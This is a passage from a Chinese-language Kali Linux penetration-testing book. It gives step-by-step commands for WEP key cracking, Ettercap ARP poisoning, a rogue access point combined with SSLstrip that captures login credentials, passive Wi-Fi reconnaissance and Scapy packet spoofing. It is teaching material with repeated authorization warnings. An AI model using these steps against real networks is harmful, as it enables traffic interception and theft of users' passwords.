你的下一步是找到要攻击的目标接入点的BSSID，为此你将使用名为Aircrack的工具，因此需要输入：
``` airodump-ng wlan0 ```
执行该命令后会开始搜索广播的BSSID，你将看到正在捕获周边接入点的BSSID以及它们使用的信道。
注意：不要攻击你邻居的无线网络，更不要在未经书面授权的情况下在生产环境中使用该工具。
回到Kali Linux中，找到要攻击的无线BSSID后，你可以按下“Ctrl+C”退出监听，停止搜索。
在Kali的输出结果中，你还能看到BSSID对应的MAC地址，它通常是由字母和数字组成的12位字符串，你需要记录下来，因为执行攻击时需要用到这个MAC地址。
下一步是找到可用于破解接入点的词表，Kali自带多个可用于此目的的工具，你也可以下载其他类似工具，不过名为“Airodump”的工具完全可以满足需求。
因此你需要输入：
``` airodump-ng --bssid 00:11:22:33:44:55:66 --channel 1 --write wepcracking wlan0 ```
注意：这只是示例，我提到的“00:11:22:33:44:55:66”需要替换为你准备攻击的BSSID的实际MAC地址，信道也需要替换为对应的值（你的目标可能是6信道或11信道）。
成功执行上述命令后，你会看到wlan0的网络监听已经启动，此时你可以在“data”列下看到数据传输情况。请记住，这一过程耗时取决于密码的复杂程度，可能需要几分钟。
等待几分钟后，你应该已经捕获到足够的数据，接下来需要打开新的终端并输入：
``` ls ```
该命令会列出你当前捕获的所有文件。
现在要破解密码，你需要输入以下命令：
``` aircrack-ng wepcracking-01.cap ```
这里的文件名“wepcracking-01.cap”仅为示例，你需要输入通过ls命令查看到的、对应捕获文件的实际文件名，即“Public”文件名旁的条目。
如果你使用的是WEP认证方式，此时密码已经被破解。Aircrack-ng通常会通过显示“KEY FOUND”来输出ASCII格式的密码。
注意：最后再次提醒你，务必确保在实机或生产环境中使用Airodump-ng已获得书面授权。如果你只是在家用实验环境（非生产环境）中练习，不会对他人造成影响；但我仍建议你关闭路由器，断开互联网连接后谨慎练习。

## 第18章 使用EtterCAP进行ARP欺骗
假设你被指派对特定主机或服务器发起中间人（MITM，Man in the Middle）攻击，工具选择可以由你自行决定。中间人攻击有多种实现方式，本章我们将使用另一款优秀的可选工具EtterCAP。
EtterCAP是实现中间人攻击的又一优秀选择，它拥有友好的图形用户界面（GUI），提供所谓“点击、选择、执行”的操作方式。
如果你在受指派进行渗透测试时遇到某些工具无法使用或无法获取的情况，掌握更多工具的用法总是更好的，你也需要知道，要实现相同的结果还有其他可选方案。
EtterCAP是Kali Linux平台自带的另一款工具。要启动EtterCAP，你可以执行以下命令：
``` ettercap -G ```
然后按下回车键。
EtterCAP启动后会等待你输入进一步指令，首先你需要点击菜单选项：Sniff > 然后选择“unified sniffing”（统一嗅探）。
接下来，你需要指定用于嗅探的网络接口，我的例子中是ethernet0。
操作后会新增一些菜单选项，现在你需要点击菜单选项：“Host”（主机），然后点击“Scan for hosts”（扫描主机）。
该操作会在5秒内完成，扫描到同一网络下的所有主机。
扫描完成后，回到菜单栏：Host > 然后点击“host lists”（主机列表），即可查看所有主机的IP地址和对应的MAC地址。
拿到主机列表后，你可以选中源地址并点击“Add to target 1”（添加到目标1），然后选中目标地址并点击“Add to target 2”（添加到目标2）。
我们使用的方法叫做ARP欺骗。ARP是地址解析协议的缩写。
路由器、三层交换机拥有ARP条目或ARP表，其中存储了所有连接到网络的IP地址及其对应的MAC地址（物理地址）。
而如果我们使用ARP欺骗，就可以通过告诉目标节点我们拥有源节点的IP地址和MAC地址，来伪造真实的源地址，这样一来，所有原本要发往真实源主机的流量，都会先发送到我们这里。
除此之外，所有原本要发往目标主机的流量也会到达我们这里，因为我们同样会对真实源节点进行欺骗，告诉它目标IP地址和MAC地址已经变为我们的设备。
ARP欺骗是发起中间人攻击的最佳方法之一，因为此时源和目标之间双向传输的所有流量实际上都会经过我们的设备。
捕获到这些流量后，我们可以选择仅对其进行分析，也可以选择进一步修改、转发到其他目的地，或是直接阻断这两台设备之间的通信。
因此，发起此类攻击的最后一步是点击名为“MITM”的菜单选项，然后选择“ARP poisoning”（ARP欺骗）。
攻击结束后如需停止ARP欺骗，点击“Stop MITM attack(s)”（停止中间人攻击）即可。
注意：最后再次提醒你，务必确保在实机或生产环境中使用该方法已获得书面授权，因为任何类型的中间人攻击都非常危险，尤其是通过注入伪造MAC地址来篡改ARP表、操控路由流量的行为。如果你只是在家用实验环境（非生产环境）中练习，不会对他人造成影响；但我仍建议你关闭路由器，断开互联网连接后谨慎练习。



# 第19章 使用端口镜像捕获流量
如果让所有连接网络的计算机都处理ARP广播包，会造成资源浪费。实际上，网络中不是该报文目的地的设备的网卡会识别出该报文并非发送给自己的，因此会直接丢弃报文，而不会将其提交给CPU处理。
开启混杂模式可以确保捕获所有流量。工作在混杂模式下时，网卡会将接收到的所有报文都发送给主机处理器，忽略地址匹配规则。一旦报文到达CPU，就可以被名为Wireshark的工具抓取并进行分析。
捕获交换网络中目标设备流量主要有三种方式：
- 第一种是ARP欺骗，也就是中间人攻击，我在上一章刚为你介绍过，它可以和其他方法配合使用。
- 捕获交换网络中目标设备流量的第二种方法是使用分接头（也称为“网络分接头”），这是一种硬件设备，你可以将其部署在布线系统的两个端点之间，捕获两者之间的流量。
- 第三种方法是端口镜像（也称为端口侦听），这可能是捕获交换网络中目标设备流量最简单的方式。在这种部署方案中，你必须能够访问目标计算机所在交换机的命令行或Web管理界面。同时，该网络交换机必须支持镜像功能，且有一个未使用的端口可供你插入嗅探器。
你可以通过SSH或控制台电缆连接到大多数思科交换机后，配置端口镜像功能。要启用端口镜像，你需要执行一条命令，强制交换机将某一个端口的所有流量复制到另一个端口。但首先，你需要通过执行以下命令列出交换机上的所有端口：
```show ip interface brief ```
如果你不熟悉思科交换机命令，也不用太担心，我们接下来只会讲解一个简单的示例。列出可用的以太网端口后，假设你想将嗅探器连接到2号端口，并把1号端口的所有流量转发到2号端口。要开始配置命令，你首先需要执行以下命令：
```configure terminal ```
或简写为：
```conf t ```
按下回车键。接下来，你需要指定源端口，本示例中源端口是1号端口，因此你要先输入“monitor”，然后跟一个任意的会话编号。会话编号可以是你选择的任意数字，接着你要指定这是源端口，最后输入端口号。然后你要输入目的端口号，也就是你的嗅探器所连接的端口。使用相同的会话编号输入同样的命令，但这次要指定为目的端口，端口号为2。你需要输入的命令如下：
```conf t ```
```monitor session 1 source interface GigabitEthernet1/0/1 ```
```monitor session 1 destination interface GigabitEthernet 1/0/2 ```
```exit ```
```exit ```
```write memory ```
要验证你的监控会话，你可以输入`show session`命令，后面跟上会话编号，本示例中编号为1，如下所示：
```show session 1 ```
输出结果会显示源端口是1号千兆以太网端口，目的端口是2号千兆以太网端口。完成上述步骤后，所有流量都会从1号端口转发到2号端口。

# 第20章 使用Kali进行被动侦察
任何人都可以监听空中的无线信号。监听无线信号时，你可以调整无线电的频率，监听客户端与接入点之间往来的特定流量，也可以先监听所有信号，之后过滤出你感兴趣的内容。就像你用手贴在耳边能听得更清楚，或者把玻璃杯贴在墙上能听到墙另一边的谈话一样，对于无线信号，你可以使用定向天线来收集特定方向上更强的信号。这意味着我可以距离你的接入点或客户端有一定距离，依然能够捕获空中的流量。也就是说，你无法察觉我正在窃听你的流量。
但我该如何监听并捕获流量呢？很简单，我会将无线电调至对应的频率信道，收集所有信号，通过协议栈对信号进行处理，最后用Wireshark这类报文分析工具将结果展示出来。空中监听是进行被动侦察的最佳方式之一。被动侦察是指你在收集网络、企业或个人的相关信息时，不会主动与系统、网络或目标个体产生交互。
你可能需要收集的信息包括：
- 接入点的厂商是什么？
- 客户端使用的MAC地址有哪些？
- 特定企业采用了哪些安全机制？
- 网络名称是什么？
- 这些接入点是否配置了访客访问权限？
- 是否有隐藏的网络名称？
通过信息收集，当你开始对部署情况形成整体认知后，就可以进入第二阶段，开始规划如何攻击该网络。在被动侦察阶段，你需要记录并绘制接入点的部署位置网络拓扑图，标注接入点名称，制作部署蓝图，并识别网络可能存在的任何弱点。如果黑客试图访问企业网络，无线网络一定是排名前三的信息获取途径，用于规划攻击行动。
要捕获并展示空中的流量，你需要一款名为Wireshark的工具。你可以从之前列出的官网下载Wireshark，也可以使用Kali Linux自带的该工具。要在Kali Linux中完成这一操作，我们需要遵循一个四步流程。我们要做的第一件事是将无线网卡设置为监听模式。这样能让网卡嗅探空中所有信号、捕获所有数据包，并将其传递给Wireshark应用程序进行展示，之后我们就可以分析这些数据包了。我们可以选择监听所有空中的信号，也可以筛选特定BSSID或特定信道上的流量。选定BSSID和/或信道后，我们就可以打开Wireshark，选择为无线网卡配置的监听接口，开始捕获数据。捕获到足够的数据后，我们可以将报文捕获文件保存下来，供后续分析。
我们要做的第一件事还是将网卡设置为监听模式。我们在上一章已经讨论过操作方法，你可以通过输入以下命令检查无线接口是否仍处于监听模式：
```iwconfig ```
这条命令可以让你查看无线接口的模式，如果你还没有进行过我们之前提到的其他修改，你的wlan接口应该仍处于监听模式。有多种方法可以启用监听模式，比如使用`iwconfig`，但这种方法并非适用于所有网卡。如果你尝试用上述命令启用监听模式但失败了，或者命令执行成功但网卡使用时的表现不符合预期，那么建议你尝试用其他方法启用监听模式。
例如，如果你的无线网卡处于“托管模式”，而你不知道如何将其切换到“监听模式”，解决方法很简单。你可以先输入以下命令禁用该接口：
```ifconfig wlan0 down ```
现在你可以启用监听模式了，但在操作之前，最好先终止所有可能干扰网卡工作在监听模式下的进程。为此我们需要使用名为airmon-ng的工具。输入以下命令：
```airmon-ng check kill ```
这条命令是让Kali检查所有可能干扰监听模式的进程，如果发现任何此类进程，就将其终止。这是一条非常简单的命令：airmon-ng是程序的名称，“check”表示检查可能干扰监听模式的进程，“kill”表示如果存在这类进程就将其终止。按下回车键后，你会看到它终止了几个进程，同时你会发现网络管理器图标消失了。这是因为该命令会终止网络管理器进程，如果你当时连接了网络，就会断开互联网连接，但这没有关系，因为启用监听模式本身也会断开网络连接。执行这一步可以让网卡在监听模式下更好地工作。
现在你就可以启用监听模式了，除了使用`iwconfig`命令外，你还可以使用以下命令：
```airmon-ng start wlan0 ```
同样，airmon-ng是我们用来启用监听模式的程序名称，“start”表示我们要在名为“wlan0”的接口上启动监听模式。如果你的无线网卡接口不是wlan0，而是wlan1或wlan2，你需要将我示例中的0替换为你自己的无线网卡接口编号。按下回车键后，你会收到一条提示，告诉你wlan0已启用监听模式。现在如果你输入`iwconfig`，会看到原先的“wlan0”接口消失了，取而代之的是一个名为“wlan0mon”的新接口，如果你查看这个接口的模式，

你会看到它处于“监控”模式。之后，只要你需要使用支持监控模式的程序，请务必把接口设置为“wlan0mon”。如果你之前尝试过用```iwconfig```命令开启监控模式但没有成功，又尝试了当前方法依然无效，那大概率是你的网卡不支持监控模式，因为并非所有网卡都支持该模式。因此你需要查阅推荐网卡相关章节。
接下来，一旦你的接口进入监控模式，你就可以捕获空中的流量了。收集到足够数据后，就可以将其展示出来了。在Kali Linux中，依次打开应用程序，找到Kali Linux Top 10安全工具，里面就有Wireshark。点击对应标签，会弹出Wireshark应用程序，列出所有可用接口。选择你的无线接口，我这里用的是wlan0mon，然后点击开始就能查看捕获的数据了。
查看捕获的数据包，你会看到其中包含发送请求、清除发送、信标帧以及部分用户数据的组合。现在你可以通过点击“保存”或“另存为”来存储所有这些数据，之后随时可以拿出来分析。捕获空中信息就是这么简单。

第21章 捕获SYN扫描攻击
TCP SYN扫描依赖三次握手过程来判断目标主机上有哪些端口处于开放状态。攻击者会向受害者的多个端口发送TCP SYN包，就像试图在端口上建立正常通信的通道一样。执行SYN扫描时，攻击者会关注三种端口状态：开放、关闭或过滤。
正常TCP握手流程如下：首先发送SYN包，然后服务器回复SYN/ACK包，最后客户端发送ACK包。接下来看开放端口的场景：如果受害者机器上有服务正在该端口监听，收到SYN包后会向攻击者回复TCP SYN/ACK包，此时攻击者就能知道该端口处于开放状态，且有服务正在监听。
再看关闭端口的场景：如果被扫描的端口没有服务监听，攻击者不会收到SYN/ACK包。根据受害者操作系统的配置不同，攻击者可能会收到一个复位包，表明该端口处于关闭状态。
最后是过滤端口的场景：攻击者可能根本收不到任何响应。这可能意味着端口被防火墙等中间设备或主机自身过滤了，也可能是响应在传输过程中丢失了。
在这个场景中，假设你有三台主机：攻击者使用IP为10.0.0.111的Kali Linux，受害者是一台IP为10.0.0.202的Windows 10主机，最后渗透测试人员会使用Kali Linux截获所有流量，分析网络中的攻击行为。现在假设你就是那名攻击者。
首先，黑客会向你的Windows 10受害者机器发起端口扫描，他会使用nmap扫描IP为10.0.0.202的Windows主机，使用的命令是：
```"nmap 10.0.0.202"```
从攻击者的视角看，扫描已经完成了，但他不知道此时网络中有渗透测试人员正在监听。
如果你切换到渗透测试人员的机器，想要抓取这名入侵者，最好的方式是查看Wireshark中的会话窗口。打开Wireshark菜单，选择“统计”选项，然后点击“会话”，再切换到“IPv4”标签页。在那里，你应该只会看到IP为10.0.0.111的攻击者和IP为10.0.0.202的受害者之间的一条IPv4会话。你还会看到这两台主机之间存在数千条TCP会话，本质上每个参与通信的端口都会生成一条新会话，数量非常多。
了解了SYN扫描可能产生的不同响应类型后，下一步自然是寻找一种快速识别开放或关闭端口的方法，答案就在会话窗口中。再次点击“TCP”标签页，在该窗口中你可以通过两次点击“数据包”列，将TCP会话按“数据包数量”降序排序（数值最高的排在顶部）。然后你应该点击“已扫描端口”，每个会话包含3个数据包。你可以点击“跟踪流”按钮查看列表中第一个数据包的详情，之后关闭该窗口，再将会话窗口最小化。
回到Wireshark主窗口，你应该会看到攻击者机器发送的初始SYN包、受害者主机回复的对应SYN/ACK包，以及攻击者主机为终止会话发送的最终复位包。如果你切回“会话”窗口，还会看到其他仅包含2个数据包的通信场景。再次查看详情的话，第一个是初始SYN包，第二个是来自受害者的复位包，这表明该端口处于关闭状态。
如果“会话”窗口中剩余的条目仅包含1个数据包，说明受害者主机从未响应初始SYN请求。

如果你想分析之前保存的现有文件，可以选择点击名为“上传PCAP捕获文件”的单选按钮。创建案件后，你可以根据当前进行的项目为其命名，然后在每个项目下创建多个会话并开始查看。Xplico可以清晰呈现受害者访问过的任何网站、图片或视频，既支持实时捕获格式，也支持在任意其他时间回放。同理，我们还可以捕获VoIP（网络电话）流量，后续可以随时进行欺骗、删除或监听。Xplico不仅仅是一款数据捕获工具，凭借其强大的功能，它也被认为是一款非常优秀的黑客工具。



# 第23章 使用Ettercap进行中间人攻击
本章我们将讲解如何使用Ettercap捕获目标设备的凭证，具体来说就是通过HTTP和FTP这两个未加密协议窃取目标的用户名和密码。本次实验环境包含一台Linux系统和一台Windows 10系统，我们将使用Ettercap将自己置于默认网关（也就是这台Windows主机）和目标之间。
要获取默认网关地址，你需要在终端中输入：
``` ip route ```
我的默认网关地址是192.168.100.1，但不管你的地址是什么，这是运行Ettercap需要掌握的核心信息。从技术角度来说，你可以选择把自己置于子网内所有设备和默认网关之间，也可以只针对单个目标。本次场景中，我们将把自己放在所有设备和默认网关之间。
首先在Kali Linux中，打开“应用程序”，然后向下滚动找到“嗅探与欺骗”选项，点击后选择“Ettercap-g”，这是Ettercap的图形化界面。图形界面打开后，点击“sniff”，再选择“unified sniffing”，就会弹出下一个窗口。
新打开的名为“ettercap Input”的窗口会询问你想要嗅探哪个网络接口。我们的Kali机器上只有一张网卡（NIC，即网络接口卡）用于统一嗅探，因此直接选择窗口显示的那个接口即可，点击“ok”。
接下来，在用Ettercap把自己置于中间人位置之前，需要先配置目标。点击“hosts”，然后选择“scan for hosts”，这会扫描目标所在的子网。我们需要使用ARP欺骗（arp poisoning）才能把自己变成指定子网的中间人。扫描完成后，再次点击“hosts”，选择“hosts list”，新窗口中会显示刚才扫描到的所有IP地址。
在这里你应该能找到你的默认网关IP地址，我的就是192.168.100.1。现在需要创建目标，选中你的默认网关对应IP（比如192.168.100.1），然后点击“Add to Target 1”。如果你还有其他想要监控的目标IP，同样可以点击选中它们，再点击“Add to Target 2”。
目标设置完成后，回到顶部窗口，点击“Mitm”（即中间人攻击的英文缩写），然后选择“arp poisoning”。完成选择后会自动弹出新窗口，勾选“Sniff remote connections”，再点击“ok”即可。
如果中间人攻击设置成功，也就是说Kali Linux机器已经处在Windows 10主机和默认网关之间，那么192.168.100.1这个IP对应的MAC地址应该和Kali Linux的MAC地址一致。要验证这一点，你需要在Windows 10主机的命令行中输入：
``` arp -a ```
ARP是地址解析协议（Address Resolution Protocol）的缩写，作用是将MAC地址和IP地址进行对应映射。在Windows上执行这个命令后，会看到一份IP地址列表，每个地址旁边都对应着它的MAC地址。注意不要搞混，Windows系统里会把IP地址标注为“Internet Addresses”，MAC地址标注为“Physical Addresses”。
你会注意到Windows里标注的“Physical Addresses”其实在技术上是不准确的，因为我们用Ettercap修改的是默认网关的MAC地址。为了100%确认，你也可以验证Kali Linux的MAC地址。回到Kali Linux的终端，输入：
``` ifconfig ```
在命令的输出结果中，找到“ether”字段，这就是Kali Linux以太网接口的MAC地址（也就是物理地址）。
确认Kali的以太网地址和Windows里的默认网关地址一致后，就说明你已经成功用Ettercap建立了中间人位置。Ettercap的优点在于，一旦你处于中间人位置，几乎不需要额外操作，只要保持它运行即可。Ettercap的窗口底部会自动捕获所有明文传输的凭证，窗口里会分别显示“USER”后面的用户名和“PASS”后面的密码，会自动弹出在窗口左侧，完全不需要你手动操作。不像Wireshark需要你盯着流量看，Ettercap的账号密码都会自动弹出来。
如果使用的是未加密协议，Ettercap会捕获所有传输的用户名和密码，因此平时应该用HTTPS代替HTTP，用SFTP或者SCP代替FTP来传输文件。当你用Ettercap进行二层中间人攻击时，终端用户完全不会察觉，因为没有任何提示弹窗，所以用户根本不知道自己的流量已经被监控。
最后再次提醒，在实战或者生产环境中使用该方法前，请务必确保你已经获得了书面授权，因为任何类型的中间人攻击都具有极高的危险性。

# 第24章 使用SSLstrip进行中间人攻击
本章我们将讲解如何在Kali Linux虚拟机上创建伪造的接入点。要完成本次攻击，你需要一块支持监听模式和主模式的USB网卡。如果你没有符合要求的USB网卡，我之前提到过的Alpha系列网卡非常推荐，售价仅约50美元，在亚马逊等渠道都可以买到。
开始操作前，我先讲解一下本次攻击的原理。整体流程的主要参与方包括受害者、攻击者、伪造接入点，以及带有互联网连接的路由器，我先给你做个高层级的流程概述。
具体流程是，攻击者首先连接到互联网，然后通过一块作为伪造接入点的USB网卡共享自己的网络连接。当其他设备连接到这个伪造接入点时，就可以正常访问互联网了。
下面我带你走一遍完整流程：首先受害者会连接到伪造的接入点，随后受害者的网络流量会被路由到伪造接入点，再传到攻击者设备上。攻击者拿到受害者的网络流量后，会使用SSLstrip对流量进行篡改和日志记录，强制受害者使用HTTP协议，从而捕获受害者输入的所有用户名和密码。SSLstrip完成流量的篡改和记录后，攻击者会把受害者的流量转发给路由器，最终路由器会把受害者的网络请求路由到受害者想要访问的网站。我们的操作本质上就是将自身置于受害者和目标网站之间，因此可以查看受害者和网站之间的所有交互数据，这也被称为中间人攻击。原理讲解完毕，现在我们可以开始实操了。
第一步我们需要连接互联网，方法是将宿主操作系统的网络连接共享给Kali Linux虚拟机。这种方法本质上就是桥接或者有线网络连接，我选择这种方式是为了不需要额外的第二块USB网卡。不过如果你有第二块USB网卡的话，也可以直接用它在Kali Linux虚拟机上连接互联网。接下来我将分享我用的具体方法。
现在我们登录宿主操作系统，只要你用它能够连接互联网，运行Kali Linux虚拟机的设备是什么类型并不重要。首先打开系统自带的网络设置，或者你的操作系统使用的任意网络管理应用。我可以从顶部菜单栏打开我的网络设置，然后选择一个无线网络连接。你可以选择任意可用的网络，只要它有互联网连接即可，如果你在移动场景下，也可以使用安卓或iPhone的4G USB调制解调器、移动热点，或者其他任何能够联网的方式。
宿主操作系统成功联网后，需要把网络共享给Kali Linux虚拟机。现在切换到Kali Linux虚拟机，点击顶部菜单栏的虚拟机菜单，展开网络适配器选项。如果你有多个网络适配器，选择最顶部的那个，它的名称应该是“Network Adapter”，后面没有数字。在这里我们需要把网络适配器的模式设置为“桥接自动检测”，这样就能从宿主操作系统连接的路由器那里获取IP地址和网络连接。设置完成后可以收起虚拟机菜单，现在就可以用这个虚拟网络建立互联网连接了。



接下来，打开网络管理器，你可以使用任意一款你拥有的网络管理器，在其中找到「有线网络」选项并点击「连接」。如果你使用的是默认网络管理器，系统应该会自动完成连接；如果没有成功连接，你可以尝试重启虚拟机，之后就能获得网络连接。如果问题仍然存在，我建议你安装「Wicd」网络管理器。

接下来，现在我们已经有了网络连接，需要找到网关IP地址并记录下来。先关闭网络管理器，打开终端，输入以下命令后按回车：
```bash
route -n
```
在输出结果中找到你的网关IP地址，我的配置中网关IP是192.168.0.1，需要记下这个地址，后续命令会用到。你可以打开记事本或者用纸笔记录，怎么方便怎么来。

现在我们已经记录了网关IP地址，接下来需要安装DHCP服务器。回到Kali终端，输入以下命令后按回车：
```bash
apt-get install dhcp3-server
```
请耐心等待DHCP服务器安装完成，安装完成后需要配置DHCP服务器。回到终端，输入以下命令后按回车：
```bash
nano /etc/dhcpd.conf
```
你会得到一个空白的DHCP配置文件，如果文件并非空白，请先删除所有原有内容，准备好后就可以开始添加配置：

首先输入：
```bash
authoritative;
```
按回车换行，输入：
```bash
default-lease-time 600;
```
再按回车换行，输入：
```bash
max-lease-time 7200;
```
再按回车换行，输入：
```bash
subnet 192.168.1.0 netmask 255.255.255.0 {
```
这里的花括号是前向花括号（左花括号），按回车换行，输入：
```bash
option routers 192.168.1.1;
```
按回车换行，输入：
```bash
option subnet-mask 255.255.255.0;
```
按回车换行，输入：
```bash
option domain-name "freewifi";
```
按回车换行，输入：
```bash
option domain-name-servers 192.168.1.1;
```
按回车换行，输入：
```bash
range 192.168.1.2 192.168.1.30;
```
按回车换行，输入后向花括号（右花括号）`}`。

以上是所有需要输入的配置内容，完整的配置示例如下：
```bash
authoritative; default-lease-time 600; max-lease-time 7200; subnet 192.168.1.0 netmask 255.255.255.0 { option routers 192.168.1.1; option subnet-mask 255.255.255.0; option domain-name "freewifi"; option domain-name-servers 192.168.1.1; range 192.168.1.2 192.168.1.30; }
```

接下来需要保存修改的内容，按下`ctrl + x`组合键，之后按`Y`键确认保存文件，再按回车键关闭编辑器。

现在需要找到USB无线网卡的名称，如果你还没有插入USB无线网卡，请先插上它，然后在终端输入以下命令后按回车：
```bash
airmon-ng
```
你会看到列出的网卡名称，我的网卡名称是`wlan0`，你的网卡名称会是类似的形式。

现在我们已经知道了网卡名称，需要开启监听模式，输入以下命令后按回车：
```bash
airmon-ng start wlan0
```
等待片刻，系统会创建监听接口，会有提示显示监听接口已经创建完成，名称为`mon0`。

现在需要创建虚假接入点，输入以下命令后按回车：
```bash
airbase-ng -c 11 -e freewifi mon0
```
这里的`mon0`需要替换为你自己的监听接口名称，我的监听接口名称是`mon0`。现在虚假接入点已经启动运行，接下来需要对`airbase`自动创建的隧道接口`at0`做一些调整。请打开一个新的终端，不要关闭运行`airbase`的终端，因为需要它持续运行。在新终端中输入以下命令后按回车：
```bash
ifconfig at0 192.168.1.1 netmask 255.255.255.0
```

现在需要调整MTU（最大传输单元），MTU的作用是让隧道接口能够传输更大的数据包，避免数据包分片。简单来说，这能够让虚假接入点处理更高的网络流量，这些流量来自所有连接到我们虚假接入点的用户。在终端中输入以下命令后按回车：
```bash
ifconfig at0 mtu 1400
```

接下来需要添加路由表，输入以下命令后按回车：
```bash
route add -net 192.168.1.0 netmask 255.255.255.0 GW 192.168.1.1
```

现在需要开启IP转发并配置iptables规则，让隧道接口能够在虚假接入点和互联网源之间转发流量。首先输入以下命令开启IP转发，按回车：
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```
接下来输入iptables规则，第一条规则如下，按回车：
```bash
iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
```
这里的`192.168.0.1`需要替换成你之前记录的网关IP地址，我的网关IP是192.168.0.1。

输入第二条iptables规则，注意`FORWARD`和`ACCEPT`需要全部大写，按回车：
```bash
iptables -P FORWARD ACCEPT
```
输入第三条规则，按回车：
```bash
iptables -A FORWARD --in-interface at0 -j ACCEPT
```
输入第四条规则，按回车：
```bash
iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
```
输入最后一条iptables规则，按回车：
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --port 10000
```

现在我们已经配置好了iptables规则，接下来需要启动DHCP服务器。输入以下命令后按回车：
```bash
dhcpd --conf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
```
再输入以下命令启动服务，按回车：
```bash
/etc/init.d/isc-dhcp-server start
```
你会看到DHCP服务器成功启动的提示，通常会显示`[....] Starting ISC DHCP server: dhcpd`。

现在是时候启动SSL Strip了，输入以下命令后按回车：
```bash
sslstrip -f -p -k 10000
```
最后一步，需要启动Ettercap，打开一个新的终端，不要关闭运行SSL Strip的终端。在新终端中输入以下命令后按回车：
```bash
ettercap -p -U -T -q -i at0
```
现在SSL Strip和Ettercap都已经运行，攻击环境搭建完成。接下来可以模拟受害者，使用我们的虚假接入点捕获账号密码。

现在可以切换到受害者的电脑，首先连接虚假接入点：打开网络管理器，扫描附近的无线网络，你会看到我们创建的名为`freewifi`的虚假接入点，点击连接即可。如果所有配置都正确，连接后你会获得网络连接。检查你的IP地址，应该在我们之前创建的DHCP地址池范围内，也就是192.168.1.2到192.168.1.30之间。

作为受害者，你可以登录你的Facebook账号，以此测试SSL Strip是否生效。你可以使用Firefox或者Google Chrome浏览器，当你尝试在地址栏输入`https://www.facebook.com`时，地址会自动变为`http://www.facebook.com`，这说明SSL Strip已经生效。如果你查看浏览器左上角的标签页，会看到一个锁形图标，这是SSL Strip伪造的图标，用来提升虚假接入点的可信度，避免受害者产生怀疑，因为用户看到锁形图标时会默认认为连接是安全的。

接下来，在Facebook页面中输入邮箱和密码即可。你可以使用

请使用虚构的用户名和密码，比如用户名填"testuser"、密码填"password123"。你用什么用户名和密码都可以，因为我们的目的不是让你登录Facebook，而是验证我们能够同时捕获用户名和密码凭证。
在你点击登录按钮前，先回到攻击者主机，监控ettercap终端。现在你可以点击Facebook的登录按钮，查看ettercap终端，就会看到有数据流过。
你会注意到"USER"字段旁的用户名，以及"PASS"字段旁的密码。
如果你用网上银行网站测试这个例子，用户名和密码大概率不会出现在ettercap终端里，但会出现在SSLstrip的日志中。
你可以尝试登录账户，终端里不会显示用户名和密码，但SSLstrip会捕获这些信息并写入日志。
现在回到攻击者计算机，打开新终端，输入以下内容：
``` cat sslstrip.log ```
然后按回车键。
现在你应该能看到用户名和密码了。用户信息会以"userId=用户名"的形式出现在日志里，密码会以"auth_passwd=密码"的形式呈现。
以上就是我想和你分享的全部示例，但请记住这种攻击是可以扩展的。
比如有一款叫"karma"的工具，它的原理是：当一台计算机寻找可连接的无线网络时，特别是它过去连接过的无线网络，会向外发送探测请求。
我们可以搭建一个服务来接收这些探测请求，然后伪造该用户正在寻找的无线网络。
当我们响应后，用户会以为自己找到了目标无线网络，他们的计算机就会自动连接上来。
基于这个还有很多可以拓展的攻击方式，不过现在我们先进入下一个攻击的讲解。
你可以先关闭用来查看SSLstrip日志的终端。
要停止ettercap，需要按下Ctrl+C，之后就可以关闭该终端。
停止SSLstrip的话同样按下Ctrl+C就可以关闭它的终端。
要停止你的伪造接入点，在Kali窗口中按下Ctrl+C，之后关闭终端即可。
我们创建的所有iptables规则会在你重启虚拟机后自动恢复为默认配置。
使用SSLstrip及其任何衍生工具前，请确保你已获得书面授权。
如果你只是在自己的家庭实验室、非生产环境中练习，不会对他人造成影响；但我仍然建议你断开网络连接、关闭路由器后谨慎练习。

# 第25章 使用Scapy进行数据包操作
Scapy是一款高级数据包操作工具，不建议新手随意尝试。
但有必要提一下这款工具的存在，它确实可以算是现有黑客工具中的“王者”。
Scapy可以帮你轻松构造几乎任何你想要的数据包。
假设你正在管理和验证防火墙的配置，其中一条策略要求你实现如下规则：
> > "任何从入站方向发往出站方向的数据包都不被允许，如果目的IP地址与源IP地址相同，则应将其丢弃。"
这条防火墙规则本身完全合理，但听起来也有点不切实际。
试想一下，一台电脑怎么可能从自己的IP地址发请求到出站方向，而且目的IP和发送方电脑的IP完全相同？这看起来是不可能的，对吗？
但从技术层面来说这是可能的，因为这可能是一个恶意数据包。
有人可能会在组织内部发起端口扫描，获取网络设备及其漏洞的相关信息，进而发起战略性攻击，这种攻击可能会损坏、禁用、克隆甚至关闭整个系统，而且攻击来源看起来是来自内部私网。
那这是怎么做到的呢？靠的正是Scapy这款工具。
Scapy很可能是Kali Linux内置的、由Python编写的最强大、最灵活的数据包操作工具。
打开Scapy的命令行界面就可以启动它并构造数据包，最棒的是我们几乎可以指定数据包的任意参数：
- 任意源IP地址
- 任意目的IP地址
- 服务类型
- IPv4或IPv6地址
- 修改任意头部字段
- 修改目的端口号
- 修改源端口号，以及其他更多参数。
此外，Scapy还支持构造自定义数据包，同时具备以下能力：
- 捕获任意流量
- 播放或重放任意流量
- 端口扫描
- 发现网络设备，还有其他更多功能。
Scapy可在Kali Linux中运行，在命令行界面输入``` scapy ``` 然后按回车键即可启动。
由于Scapy的功能非常丰富，我们从最简单的发送命令开始讲起：
``` send(IP(src="10.10.10.20", dst="10.10.10.2")/ICMP()/"OurPayload") ```
这条构造数据包的命令表示：我想从源IP地址10.10.10.20向目的IP地址10.10.10.2发送一个ping请求，同时让这个数据包看起来像ICMP回显请求，还要在里面加入名为OurPayload的负载。
Scapy就是不爱按常理出牌。因此我们不需要严格遵循标准的网络协议，反而可以构造出在真实网络中逻辑上根本不可能存在的数据包。
我们可以向多个目标发送构造好的数据包，等待响应，分析响应内容看是否触发了异常行为，进而在这个过程中发现漏洞。
要退出Scapy，需要按下“Ctrl+d”，这样就会回到普通命令行提示符界面。
如果你想再次执行Scapy命令，需要重新输入``` scapy ``` 然后按回车键启动它。

按下*回车键*后，输出的内容可能填满整本书；但我想告诉你的是，Scapy不仅能构造数据包，还可以根据需要充当入侵者或嗅探器。

# 第26章 针对Rogue接入点的解除认证攻击
